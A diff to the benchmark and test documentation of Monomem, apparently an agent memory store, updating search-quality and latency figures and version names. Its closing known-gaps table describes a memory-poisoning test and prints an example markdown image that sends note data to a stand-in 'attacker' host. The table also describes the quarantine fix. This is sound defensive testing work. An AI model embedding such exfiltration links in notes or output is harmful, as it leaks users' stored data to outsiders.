@@ -240,9 +240,10 @@ monomem bench --locomo      [--data file] [--limit N] [--mode keyword|hybrid] [-
   `GET /search`: FTS5/BM25 with every word first, then notes matching some of the words, always ranked
   below full matches (since Monomem 1.2.0 that second step is one BM25 query over the keywords joined with OR; before, per-keyword
   rankings fused with RRF). `relevant` is `runRelevantSearch` (the `state_relevant` tool and `POST /relevant`): stop words
-  dropped, any keyword qualifies, one BM25 OR query (1.2.0; before, per-keyword rankings fused with RRF). Since 1.2.0 every
-  query word of 5+ ASCII letters also loses a common English suffix before it becomes a prefix term
-  (`recommendations` searches as `recommend*`); the index itself is unchanged. `--mode hybrid` also scores
+  dropped, any keyword qualifies, one BM25 OR query (1.2.0; before, per-keyword rankings fused with RRF). Since 1.2.0, in that
+  second (some-of-the-words) step only, a query word of 5+ ASCII letters also loses a common English suffix before it
+  becomes a prefix term (`recommendations` searches as `recommend*`); the all-words step uses words as typed, and the
+  index itself is unchanged. `--mode hybrid` also scores
   `runSearch(mode: "hybrid")` (BM25 + embeddings, RRF) when an embedding server answers; otherwise it is reported as skipped.
 - **Metrics.** `R@5`, `R@10`: any gold session (or turn) in the top k. `Rall@10`: every gold one in the top 10.
   `nDCG@10` with binary relevance. `MRR` over the top 50. Search latency p50/p95 per query; indexing time per
@@ -259,47 +260,57 @@ rerun; its 2026-10-31 numbers below used the older keyword ranking inside the fu
 
 | Run | Search | R@5 | R@10 | Rall@10 | nDCG@10 | MRR | search p50 |
 |---|---|---|---|---|---|---|---|
-| LongMemEval-S, session (470 q) | keyword (`state_search`) | **97.4** (was 95.1) | 98.7 (was 97.4) | 91.9 (88.3) | 90.8 (86.6) | 91.5 (87.4) | 3.0 ms |
-| LongMemEval-S, session | relevant (`state_relevant`) | **97.7** (was 95.3) | 98.9 (97.7) | 92.1 (88.5) | 90.7 (86.7) | 91.2 (87.4) | 1.3 ms |
-| LongMemEval-S, turn (231,606 notes) | keyword | 96.6 | 97.9 | 91.1 | 90.6 | 91.8 | 2.8 ms |
-| LongMemEval-S, turn | relevant | **97.0** (was 95.3 on 2026-10-31) | 98.3 (97.7) | 91.5 (87.9) | 91.0 (87.5) | 92.3 (88.6) | 1.6 ms |
-| LoCoMo-10, session (1,982 q) | keyword | 89.3 (was 89.3) | 95.2 (94.9) | 87.6 (86.4) | 78.2 (77.3) | 75.9 (75.1) | 1.3 ms |
-| LoCoMo-10, session | relevant | 89.4 (was 89.3) | 95.2 (94.9) | 87.5 (86.6) | 78.1 (77.3) | 75.8 (74.9) | 0.8 ms |
-| LoCoMo-10, turn (dialog id) | keyword | **59.0** (was 45.2) | 66.5 (51.7) | 57.2 (45.5) | 47.3 (37.9) | 45.4 (37.1) | 1.8 ms |
-| LoCoMo-10, turn (dialog id) | relevant | **59.2** (was 46.5) | 66.6 (52.8) | 57.3 (46.3) | 47.5 (38.9) | 45.5 (38.0) | 1.6 ms |
+| LongMemEval-S, session (470 q) | keyword (`state_search`) | **97.7** (was 95.1) | 98.7 (was 97.4) | 92.3 (88.3) | 90.9 (86.6) | 91.8 (87.4) | 2.9 ms |
+| LongMemEval-S, session | relevant (`state_relevant`) | **97.7** (was 95.3) | 98.7 (97.7) | 92.3 (88.5) | 90.8 (86.7) | 91.5 (87.4) | 1.3 ms |
+| LongMemEval-S, turn (231,606 notes) | keyword | 96.8 | 98.1 | 91.1 | 90.7 | 91.8 | 2.8 ms |
+| LongMemEval-S, turn | relevant | **97.0** (was 95.3 on 2026-10-31) | 98.3 (97.7) | 91.3 (87.9) | 90.9 (87.5) | 92.0 (88.6) | 1.6 ms |
+| LoCoMo-10, session (1,982 q) | keyword | 89.4 (was 89.3) | 95.3 (94.9) | 87.9 (86.4) | 78.6 (77.3) | 76.3 (75.1) | 1.4 ms |
+| LoCoMo-10, session | relevant | 89.5 (was 89.3) | 95.4 (94.9) | 87.8 (86.6) | 78.4 (77.3) | 76.0 (74.9) | 0.9 ms |
+| LoCoMo-10, turn (dialog id) | keyword | **59.2** (was 45.2) | 66.5 (51.7) | 57.2 (45.5) | 47.3 (37.9) | 45.4 (37.1) | 1.8 ms |
+| LoCoMo-10, turn (dialog id) | relevant | **59.4** (was 46.5) | 66.8 (52.8) | 57.4 (46.3) | 47.4 (38.9) | 45.5 (38.0) | 1.7 ms |
 
-"Was" is 1.1.1 on the same machine, same day (the LongMemEval-S turn row compares with the 2026-10-31 run). The largest single change on LongMemEval-S is
-single-session-preference: R@5 73.3 to 90.0 (30 questions). On LoCoMo turns the keyword search now beats the
-2026-10-31 hybrid run (R@5 59.0 vs 52.1), with no embedding server.
+"Was" is 1.1.1 on the same machine, same day (the LongMemEval-S turn row compares with the 2026-10-31 run). The largest
+single change on LongMemEval-S is single-session-preference: R@5 73.3 to 90.0 (30 questions). On LoCoMo turns the keyword
+search now beats the 2026-10-31 hybrid run (R@5 59.2 vs 52.1), with no embedding server.
 
-**Token cost of the top 5** (keyword search, estimated tokens per question, p50 / p95):
+These are the numbers after the 1.2.0 review fixes (words used as typed in the all-words step, a narrower suffix list,
+query caps). The first 1.2.0 draft, which also trimmed suffixes in the all-words step, scored a few tenths lower
+(LongMemEval-S keyword R@5 97.4, LoCoMo turn 59.0).
 
-| Run | five full notes | five `memory_index` rows |
+**Token cost of the top 5** (keyword search, estimated tokens per question):
+
+| Run | five full notes, p50 / p95 | five `memory_index` rows, p50 / p95 |
 |---|---|---|
-| LongMemEval-S, session | 16,350 / 20,162 | 180 / 184 |
+| LongMemEval-S, session | 16,268 / 20,042 | 180 / 184 |
+| LongMemEval-S, turn | 1,386 / 2,486 | 185 / 193 |
 | LoCoMo-10, session | 4,133 / 5,446 | 165 / 166 |
-| LoCoMo-10, turn | 203 / 305 | 168 / 169 |
+| LoCoMo-10, turn | 203 / 304 | 168 / 169 |
 
-So on whole conversations, looking at the index first costs about 1 % of pulling the five full notes; on short
-one-line notes there is little to save. These are bench notes (whole sessions or single turns), not typical
-hand-written notes.
+Reading the index is not the whole cost: the agent then opens the note it wants with `memory_get`, which costs that
+note's full size (on LongMemEval-S sessions, about 3,250 tokens for one, a fifth of the five-note figure). So on whole
+conversations "index first, then one note" is about 3,400 tokens against 16,300 for the five full notes; on short
+one-line notes (LoCoMo turns) the index rows cost about as much as the notes and there is nothing to save. These are
+bench notes (whole sessions or single turns), not typical hand-written notes.
 
-**How this was chosen, honestly.** The three changes (one BM25 OR query for the fallback and for `relevant`, and
-query-side suffix trimming) were picked by running these same two datasets; there is no held-out split. Each was
-tried on its own and kept only if it did not lower R@5 on either dataset by more than a few tenths: suffix
+**How this was chosen, honestly.** The changes (one BM25 OR query for the fallback and for `relevant`, and
+query-side suffix trimming in that second step) were picked by running these same two datasets; there is no held-out
+split. Each was tried on its own and kept only if it did not lower R@5 on either dataset by more than a few tenths: suffix
 trimming alone moved LongMemEval-S keyword R@5 from 95.1 to 94.9 and LoCoMo turns from 45.2 to 47.2; the OR query
-alone moved them to 97.0 and 56.2; together 97.4 and 59.0. Dropping the "every word first" step was also tried
-and was slightly worse (97.2), so full matches still rank first. No question-specific rule or dataset word list
-is involved.
+alone moved them to 97.0 and 56.2; together 97.4 and 59.0, and 97.7 and 59.2 after the review fixes above. Dropping
+the "every word first" step was also tried and was slightly worse (97.2), so full matches still rank first. The
+suffix list is a general English one with a short list of words it must not trim (`evening`, `species`, ...); no
+question-specific rule or dataset word list is involved.
 
 **Latency on a large store.** On a 50,000-note synthetic store with a skewed 5,000-word vocabulary, a 21-word question
-took about the same time as before (state_search 105 vs 121 ms, state_relevant 106 vs 105 ms, mean of 10). On a
-store where every note contains the same 20 words, the same question was slower: 470 vs 176 ms, because the OR query
-scores every note in one pass.
+took about the same time as before (state_search 106 vs 121 ms, state_relevant 90 vs 105 ms, mean of 10). On a
+store where every note contains the same 20 words, the same question was slower: about 440 vs 176 ms, because the OR
+query scores every note in one pass. A query is capped at 4,096 characters and its first 64 words (the API and MCP
+refuse a longer one), so a pasted 10,000-word query answers in milliseconds instead of holding the database for
+seconds, as it could before 1.2.0.
 
 ### Results, 2026-10-31 (before 1.2.0)
 
-Machine: Windows 11 Home, RTX 5080 PC, Node v24.18.0, Monomem 2.0.0. Embeddings for `hybrid`: `nomic-embed-text`
+Machine: Windows 11 Home, RTX 5080 PC, Node v24.18.0, OneMemory 2.0.0 (the release before the rename to Monomem, which restarted at 1.0). Embeddings for `hybrid`: `nomic-embed-text`
 through a local Ollama (`MONOMEM_EMBEDDINGS=on`, `MONOMEM_EMBED_URL=http://127.0.0.1:11499/v1/embeddings`).
 Commands exactly as above. Wall time with embeddings: LongMemEval session 15 min (embedding every session is the cost),
 LoCoMo a few minutes; keyword-only runs take seconds.
@@ -312,7 +323,7 @@ LoCoMo a few minutes; keyword-only runs take seconds.
 | relevant (`state_relevant`) | 95.3 | 97.4 | 88.5 | 87.1 | 88.0 | 1.4 / 3.0 ms |
 | hybrid (BM25 + embeddings) | **96.8** | **98.5** | **93.0** | **90.4** | **91.4** | 21 / 30 ms |
 
-Before the 2.0.0 fallback, `state_search` needed every word of the question and scored R@5 11.9 here.
+Before the OneMemory 2.0.0 fallback, `state_search` needed every word of the question and scored R@5 11.9 here.
 
 Per question type, `relevant`:
 
@@ -342,7 +353,7 @@ nDCG@10 87.5, MRR 88.6, search p50 1.7 ms.
 
 ### How to read these numbers
 
-- **Natural-language questions to `state_search` used to fail.** Before 2.0.0 it needed every word ("what", "did",
+- **Natural-language questions to `state_search` used to fail.** Before OneMemory 2.0.0 it needed every word ("what", "did",
   "I", ...) in one note and found the right session 12 % of the time on LongMemEval-S. The any-word fallback fixed it
   (95 %); full matches still rank first, so short exact queries behave as before.
 - **Hybrid is not always better.** It helps when notes are short (LoCoMo turns: R@10 52 to 64) and on LongMemEval-S
@@ -384,7 +395,7 @@ Nothing is deleted, undo is one command, and every edit now keeps the text it re
 [docs/replacing-memories.md](./replacing-memories.md).
 
 **Known gaps.** Scenarios that fail because Monomem lacks the behaviour are kept, marked, and listed here and in the report. They do not fail the run
-(`--strict-gaps` makes them), and a gap that starts to pass fails the run until its marker is removed. The four recorded at 1.5.0 are fixed, and so is the one the memory-poisoning suite found (`GAP-POISON-MDLINK`, 2.0.0). **None is open.**
+(`--strict-gaps` makes them), and a gap that starts to pass fails the run until its marker is removed. The four recorded at 1.5.0 are fixed, and so is the one the memory-poisoning suite found (`GAP-POISON-MDLINK`, OneMemory 2.0.0). **None is open.**
 
 | Gap | What was missing | Status | Scenarios |
 |---|---|---|---|
@@ -393,4 +404,4 @@ Nothing is deleted, undo is one command, and every edit now keeps the text it re
 | `GAP-HISTORY` | No version history of bodies; after a bad overwrite the trusted original was not recoverable from Monomem. | **Fixed in 1.6.0**: bounded, admin-only history with restore (restore is a new version). | B08, B09 (now pass) |
 | `GAP-REST-CAS` | The REST `PUT /notes/:id` ignored `if_rev`. | **Fixed in 1.5.0**: it takes `if_rev` and answers 409. | B16 (passes) |
 | `GAP-CONFIDENCE` | No confidence field; a client could send one but it was dropped silently. | **Fixed in 1.6.0**: optional, validated, labelled as a claim. | D10 (now passes) |
-| `GAP-POISON-MDLINK` | The write-time linter did not flag markdown images whose URL smuggles note data out (e.g. `![x](https://attacker/p?data=...)`); such a note was stored as ordinary memory. | **Fixed in 2.0.0**: a remote markdown image with a query string is held in quarantine; README badge hosts are exempt. | E11 (now passes) |
+| `GAP-POISON-MDLINK` | The write-time linter did not flag markdown images whose URL smuggles note data out (e.g. `![x](https://attacker/p?data=...)`); such a note was stored as ordinary memory. | **Fixed in OneMemory 2.0.0**: a remote markdown image with a query string is held in quarantine; README badge hosts are exempt. | E11 (now passes) |
